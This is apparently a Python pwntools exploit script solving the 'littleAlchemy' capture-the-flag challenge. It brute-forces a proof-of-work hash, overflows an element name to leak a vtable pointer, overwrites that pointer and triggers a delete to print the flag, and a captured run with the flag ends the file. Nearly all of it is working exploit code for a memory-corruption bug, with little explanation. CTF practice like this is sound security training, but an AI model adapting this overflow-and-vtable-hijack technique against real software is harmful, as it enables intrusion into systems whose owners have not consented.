#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import itertools
import hashlib

exe = context.binary = ELF('littleAlchemy')

def findHash(plainStart, hashEnd):
    print(f"Calculating hash for plainStart={plainStart} and hashEnd={hashEnd}...")
    alphabet = string.ascii_letters + string.digits

    for item in itertools.product(alphabet, repeat=4):
        if str(hashlib.sha256(str.encode(plainStart + "".join(item))).hexdigest()).endswith(hashEnd):
            fnd = plainStart + "".join(item)
            print(f"Hash found: {fnd}")
            return plainStart + "".join(item)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        io = remote('challs.m0lecon.it', 2123)
        io.recvuntil('with ')
        starting = io.recvuntil(' ', False).decode()
        io.recvuntil('in ')
        ending = io.recvline(False)[:-1].decode()

        io.sendline(findHash(starting, ending))

        return io
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def menu(p):
    p.recvuntil('\n>')


def create_element(p, position, first = -1, second = -2):
    menu(p)
    p.sendline('1')
    p.recvuntil('element: ')
    p.sendline(f'{position}')
    p.recvuntil(']: ')
    p.sendline(f'{first}')
    p.recvuntil(']: ')
    p.sendline(f'{second}')


def edit_element(p, position, payload):
    menu(p)
    p.sendline('4')
    p.recvuntil('rename: ')
    p.sendline(f'{position}')
    p.recvuntil('name: ')
    p.sendline(payload)


def copy_element(p, src, dest):
    menu(p)
    p.sendline('6')
    p.recvuntil('element: ')
    p.sendline(f'{src}')
    p.recvuntil('element: ')
    p.sendline(f'{dest}')


def get_records(p, amount):
    menu(p)
    p.sendline('3')
    records = []

    for i in range(amount):
        line = p.recvline(False)
        records.append(line)

    return records

io = start()

create_element(io, 0)
create_element(io, 1)
create_element(io, 2)

payload = b'A'*16 + b'B'*32 + b'C'*8
edit_element(io, 0, payload)
copy_element(io, 0, 1)

records = get_records(io, 2)
record = records[1][5+56:]
vt_address = u64(record.ljust(8, b'\x00'))

log.info(f'vt_address = {vt_address:#x}')

create_element(io, 3)
create_element(io, 4)
create_element(io, 5)

payload = b'A'*16 + b'B'*32 + b'C'*8 + p64(vt_address + 8)
edit_element(io, 3, payload)
copy_element(io, 3, 4)

io.sendline('5')
io.sendline('5')

io.interactive()

"""
Operations: [1]->Create_element [2]->Print_element [3]->Print_all [4]->Edit_element [5]->Delete_element [6]->Copy_name [7]->Exit
>index of element to delete: ptm{vT4bl3s_4r3_d4ng3r0us_019} + Fire
Operations: [1]->Create_element [2]->Print_element [3]->Print_all [4]->Edit_element [5]->Delete_element [6]->Copy_name [7]->Exit
"""